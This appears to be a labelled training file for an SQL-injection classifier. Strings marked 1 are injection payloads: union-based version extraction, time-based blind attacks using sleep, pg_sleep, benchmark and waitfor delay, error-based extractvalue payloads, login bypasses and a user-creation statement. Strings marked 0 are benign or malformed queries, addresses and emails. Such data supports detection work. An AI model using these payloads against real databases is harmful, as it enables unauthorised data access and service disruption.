"1""  )   and   (  3020  =  3020  )  *6703 and   (  ""hkjf""  =  ""hkjf";1
"-9891"" union all select 7489#";1
"DELETE FROM sessions WHERE description = 'Sample text';";0
1'  )   where 1225  =  1225 and elt  (  8831  =  7779,7779  )  --;1
SELECT * FROM bet WHERE NOT mean = 'organization'  AND NOT condition = 'cutting';0
94731203e;0
1  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ;1
1  )   where 5774  =  5774;1
av. benisa 43, 10d;0
SELECT TOP 3 * FROM closer WHERE rather = 'log';0
"UPDATE orders SET id = '2023-01-01' WHERE description = 'active';";0
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--;1
1%'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  '%'  =  ';1
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --";1
-7255' union all select 2127,2127,2127,2127,2127#;1
"1"" where 2462  =  2462 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --";1
-1171' union all select 3958,3958,3958,3958,3958--;1
escritor miguel delibes 0, 7?b;0
SELECT * FROM recently 3;0
1'  )   union all select null--;1
1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ;1
union all select @@version--;1
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'mfib'  =  'mfib;1
"SELECT created_at, quantity, status, price FROM products WHERE user_id = 'user123';";0
1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ;1
1%'  )   and elt  (  4670  =  9403,9403  )   and   (  '%'  =  ';1
1%'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  '%'  =  ';1
1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'ffzv'  =  'ffzv;1
1'  )   where 1625  =  1625 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --;1
SELECT sent,join,enjoy,putting,vast     (  (  average JOIN extra ON visit.good =  dust.higher )   INNER JOIN shownON Orders.till =  example.steadyID ) ;0
"admin"") or ""1""=""1""/*";1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)));1
"1""  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --";1
SELECT * FROM stopped WHERE of BETWEEN 'essential' AND 'raise';0
"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""bxct"" like ""bxct";1
SELECT AVG ( begun ) FROM band SELECT SUM ( chosen ) ;0
medwin-whittinghill@enla.th;0
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual# gnga;1
DELETE FROM explain WHERE dollar = 'cake';0
"1%""   )    )     )   and sleep  (  5  )  #";1
SELECT * FROM science WHERE heading = 'diameter' FETCH FIRST 3 ROWS ONLY;0
SELECT COUNT ( today ) FROM atomic;0
SELECT MIN ( real )  AS means FROM struggle;0
SELECT visitor FROM studying;0
"DELETE FROM orders WHERE user_id = '2023-01-01';";0
revuelta borgua;0
SELECT consonant ( s )  FROM firm;0
1'  ) ;1
casasnova vadal;0
SELECT * FROM coach WHERE wonder LIKE '%know%';0
-7231   )    )    union all select 7639#;1
SELECT * FROM stood WHERE NOT early = 'although'  AND NOT dollar = 'sight';0
"1%""  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """;1
SELECT COUNT ( everyone ) FROM color;0
SELECT * FROM blank ORDER BY label, engine;0
mcguinness.clayburgh7@eldeseodepecar.gu;0
SELECT * FROM excellent WHERE pressure = 'sides'  OR section = 'cutting';0
1',  (  case when 3598  =  2118 then 1 else null end  )  ;1
1%'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  '%'  =  ';1
1'   )    )    as bsvk where 5985  =  5985 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --;1
INSERT INTO angry  ( memory, built, riding )  VALUES  ( 'tried', 'seeing', 'finest' )  ;0
SELECT MIN ( partly )  AS usually FROM combination;0
1' in boolean mode  )   and elt  (  4249  =  4249,7259  )  #;1
"-2072""  )   as rjcz where 2491  =  2491 or 6872  =  6872--";1
SELECT AVG ( Price ) FROM western;0
â€˜ or 1  =  1 --;1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#;1
SELECT * FROM group WHERE figure = 'vapor' LIMIT 3;0
royo, el;0
select * from users where id  =  1 or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1;1
SELECT DISTINCT corner FROM shore;0
"1""  )   where 3122  =  3122 and sleep  (  5  )  #";1
"admin""  )   or ""1""  =  ""1""/*";1
SELECT television FROM previous UNION ALL SELECT fifteen FROM jar ORDER BY equal;0
SELECT COUNT ( climate )  FROM attack;0
yarela;0
)   or   (  a  =  a;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12;1
SELECT * FROM came  WHERE sun NOT LIKE '[column]%';0
1'||  (  select 'npel' from dual where 5258  =  5258;1
SELECT * FROM vowel WHERE engine LIKE '%powerful%';0
SELECT * FROM future WHERE NOT stream = 'replace'  AND NOT call = 'pay';0
1%'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
"INSERT INTO users (price, email) VALUES (456, 'pending');";0
select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1';1
"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""ipqw"" like ""ipqw";1
"DELETE FROM users WHERE id = '2023-01-01';";0
" select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1";1
SELECT TOP 3 * FROM least WHERE cook = 'wolf';0
SELECT AVG ( outside ) FROM feel SELECT SUM ( breakfast ) ;0
1%' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and '%'  =  ';1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  ""%""  =  """;1
SELECT * FROM thumb ORDER BY belong;0
SELECT TOP 50 PERCENT * FROM something;0
SELECT * FROM news WHERE gently NOT LIKE '[paper]%';0
1 or benchmark(10000000,MD5(1))#;1
SELECT TOP 3 * FROM ill WHERE store = 'sister' SELECT * FROM feet;0
"1"" and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --";1
-8370'   )    )    or   (  3501  =  6407  )  *6407 and    (    (   'agcm' like 'agcm;1
1'  )   union all select null,null,null,null,null,null#;1
SELECT save ( s )  FROM fairly UNION ALL;0
-9841 where 4612  =  4612 union all select 4612--;1
"DELETE FROM sessions WHERE price = 'active';";0
"1""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""dzse""  =  ""dzse";1
entwistle_ruetting@comonuevo.ro;0
SELECT * FROM  ( SELECT far FROM handle ) ;0
1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +';1
"1"" where 4445  =  4445 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --";1
"1""  )   rlike sleep  (  5  )   and   (  ""efoq"" like ""efoq";1
" select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1";1
dasya4;0
1  )   or benchmark  (  10000000,MD5  (  1   )    )   #;1
"SELECT * FROM thy WHERE stems BETWEEN ""suit"" AND    ""breath""";0
SELECT * FROM current ORDER BY blind DESC;0
"SELECT * FROM mother WHERE information BETWEEN ""found"" AND    ""water""";0
magnin_arne@tiebreak.com.sr;0
SELECT dear FROM famous UNION SELECT equipment FROM power ORDER BY hurry;0
8,99E+15;0
"INSERT INTO sessions (price, created_at, email) VALUES (456, 'user123', 'john@example.com');";0
SELECT AVG ( Price ) FROM upward;0
SELECT * FROM brother ORDER BY spring ASC, laid DESC;0
bebedizo;0
"SLEEP(5)=""";1
SELECT * FROM wore WHERE weak = 'gas'  OR additional = 'wherever';0
purpurania, 79 3?b;0
1'  )   as pogx where 4105  =  4105 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --;1
SELECT * FROM quite ORDER BY two, edge;0
31271;0
8,64E+15;0
SELECT * FROM fat WHERE practice IN  ( 'fifteen', 'wall', 'ear' )  ;0
SELECT * FROM variety WHERE gun = 'appropriate' LIMIT 3;0
-3361 where 1335  =  1335 or elt  (  5891  =  5092,5092  )  --;1
or sleep  (  __TIME__  )    =  ';1
SELECT * FROM sit FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM apart;0
"-9353"" where 4607  =  4607 union all select 4607,4607,4607,4607,4607,4607#";1
SELECT AVG ( community )  FROM supper  SELECT SUM ( spring ) ;0
kiam;0
SELECT MIN ( stared )  AS substance FROM easier;0
SELECT DISTINCT badly FROM pot;0
"DELETE FROM employees WHERE id = 'user123';";0
reis;0
SELECT TOP 3 * FROM split;0
SELECT * FROM desk WHERE memory = 'nearest'  AND  ( someone = 'crowd' OR plate = 'could' ) ;0
" select * from users where id  =  1 or "",;"" or 1  =  1 -- 1";1
tomkin;0
"1%""  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --";1
-2028'   )    )     )   union all select 8698,8698,8698,8698#;1
SELECT * FROM being ORDER BY said ASC, coal DESC;0
"admin"" or 1=1--";1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""vcvb"" like ""vcvb";1
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP);1
1'+  (  select rdwb where 2498  =  2498 and 3429  =  7639--;1
SELECT AVG ( slightly ) FROM vertical;0
"SELECT * FROM consonant WHERE grandfather BETWEEN ""living"" AND    ""against""";0
select * from users where id  =  1 union select 1 1$,version  (    )   -- 1;1
"UPDATE sessions SET status = 'pending' WHERE id = 'Sample text';";0
"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""mjkl""  =  ""mjkl";1
INSERT INTO angry  ( memory, built, riding )  VALUES  ( 'tried', 'seeing', 'finest' )  ;0
"1%""  )   order by 1#";1
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#;1
1%'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  ';1
1 where 9872  =  9872;1
"-2059%"" or elt  (  4587  =  3101,3101  )   and ""%""  =  """;1
"1"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ";1
1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'zypa'  =  'zypa;1
6,04E+15;0
SELECT * FROM occasionally WHERE headed NOT BETWEEN 'firm' AND 'thin';0
SELECT * FROM this ORDER BY older ASC, clearly DESC;0
SELECT COUNT ( paper )  FROM basic;0
1'||  (  select 'sned' where 4957  =  4957 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
SELECT * FROM  ( SELECT treated FROM naturally ) ;0
f8av2;0
-9564 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ;1
SELECT TOP 3 * FROM hall;0
1   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   5281  =  5281;1
traveria morera;0
SELECT * FROM born 3 SELECT * FROM us;0
SELECT are AS rod, fence AS [worker]  FROM swung;0
SELECT TOP 3 * FROM drew;0
select * from users where id  =  11<1# union select 1,version  (    )   -- 1;1
DELETE FROM right WHERE gather = 'already';0
"SELECT status, name FROM products WHERE price = 'active';";0
SELECT saddleID AS ID, shelter AS shade FROM order;0
SELECT * FROM talk WHERE sugar BETWEEN '1996-07-01' AND '1996-07-31';0
"1"" where 1982  =  1982";1
-1772' or 7911  =  4985#;1
SELECT * FROM dish WHERE west IN  ( SELECT army FROM laugh ) ;0
"'; desc users; --";1
SELECT * FROM constantly;0
29540;0
SELECT COUNT ( soldier )  FROM farmer;0
select * from users where id  =  1 or <. union select 1,@@VERSION -- 1;1
"or SLEEP(5)=""";1
WHERE 1=1 AND 1=0--;1
6,20E+15;0
"DELETE FROM inventory WHERE user_id = 123;";0
SELECT * FROM gold WHERE greatly = 'consonant' LIMIT 3;0
SELECT AVG ( primitive ) FROM nobody;0
SELECT AVG ( stomach ) FROM another SELECT SUM ( layers ) ;0
admin'or 1=1 or ''=';1
UPDATE shorter SET am =  'forgot', City =  'mysterious' WHERE height =  away;0
"create user name identified by pass123 temporary tablespace temp default tablespace users;";1
SELECT * FROM orbit WHERE card = 'children'  OR regular = 'path';0
SELECT Count ( * )  AS discover;0
INSERT INTO remain ( disappear, drawn, bite, number, rough, please )  VALUES  ( 'fifteen', 'dance'. seed', 'lack', 'period', 'ten', 'task' )  ;0
"1""  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --";1
SELECT store ( s ) FROM bare INNER JOIN;0
"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""dacx""  =  ""dacx";1
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'inec'  =  'inec;1
SELECT difficultyID AS ID, save AS even FROM highest;0
ORDER BY 29--;1
6,72E+15;0
navarredonda de la rinconada;0
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10;1
SELECT * FROM winter;0
ronet_huebner@nikemujeres.bm;0
SELECT range,nuts,individual,hospital,present     (  (  continent JOIN move ON beat.grass =  weak.hungry )   INNER JOIN accidentON Orders.current =  chest.trafficID ) ;0
1' where 1628  =  1628;1
SELECT * FROM apple WHERE phrase BETWEEN 'wonder' AND 'practical';0
1' where 1652  =  1652 and sleep  (  5  )  #;1
-9622'   )    )     )   order by 1#;1
" select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1";1
SELECT * FROM sets ORDER BY score, fierce;0
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...;1
SELECT COUNT ( whale )  FROM chamber;0
SELECT grade, reason, automobileFROM no WHERE obtain  IS NOT NULL;0
SELECT MIN ( purpose )  AS caught FROM throughout;0
SELECT TOP 3 * FROM keep SELECT * FROM nearby 3SELECT * FROM improve;0
1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'hqqj'  =  'hqqj;1
1  )   where 5232  =  5232 union all select null,null,null#;1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  GRANTED_ROLE   )    )    FROM DBA_ROLE_PRIVS WHERE GRANTEE  =  SYS.LOGIN_USER   )    )    AND 'i'  =  'i;1
SELECT column_name ( s )  FROM individual,moon;0
1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --;1
"DELETE FROM users WHERE quantity = 123;";0
SELECT COUNT ( climate )  FROM attack;0
-8098%'  )   union all select 5697,5697,5697,5697,5697,5697,5697,5697,5697,5697#;1
or benchmark(50000000,MD5(1))--;1
"""a"""" or 3  =  3--""";1
5756;0
SELECT * FROM sets ORDER BY score, fierce;0
SELECT trail,land,tent FROM low LEFT JOIN Orders ON library.nationalID =  lot.eventually ORDER BY fine.red;0
SELECT die ( s )  FROM great;0
"SELECT name FROM logs WHERE description = 'pending';";0
-2751 where 6334  =  6334 or   (  9668  =  5845  )  *5845--;1
SELECT * FROM rate WHERE same BETWEEN 'two' AND 'congress';0
05072293b;0
1' in boolean mode  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #;1
HAVING 1=0#;1
" select * from users where id  =  1 or ""%;"" or 1  =  1 -- 1";1
declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ;1
SELECT small ( s )  FROM force LEFT JOIN;0
select * from users where id  =  1 + @<1# union select 1,version  (    )   -- 1;1
1'+  (  select 'hoqt' where 4877  =  4877 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
